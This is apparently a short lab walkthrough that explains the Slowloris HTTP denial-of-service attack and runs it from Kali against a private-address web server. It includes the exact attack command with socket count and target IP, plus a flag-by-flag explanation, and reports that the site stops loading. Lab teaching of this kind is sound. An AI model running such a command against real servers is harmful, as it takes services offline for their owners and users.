This is Offensive Security:

 

Slowloris is an application layer DDoS attack which uses partial HTTP requests to open connections between a single computer and a targeted Web server, then keeping those connections open for as long as possible, thus overwhelming and slowing down the target.

 

Take the server down by denial of service

Accessing the webserver (192.168.86.155) from Kali: : webserver is open at port 80 and 443

 

 

Preparing DoS attack from Kali to take down the Webserver in Ubuntu using Slowloris:

 

In Kali make a directory named slowloriss

(kali㉿kali)-[~/Desktop] $ mkdir slowloris

                                                                                        

 (kali㉿kali)-[~/Desktop]

┌──(kali㉿kali)-[~/Desktop/slowloris]

Attack execution command: here -s is no. of socket, -v for verbose, 192,168.86.155 is the victim IP, slowloris.py is the payload

┌──(kali㉿kali)-[~/Desktop/slowloris/slowloris]

└─$ python3 slowloris.py 192.168.86.155 -s 1000 -v         

Here, payload = slowloris.py

                No. of Sockets connection we want = -s 1000

                Verbose = -v

                IP of victim = 192.168.86.155     

Slowloris enabled so many connection to the webserver that we could not load the site. This is a simple demo of DoS attack. DoS attack because we initiated attack from one PC (one IP) not multiple PC.

Web server will be unavailable.
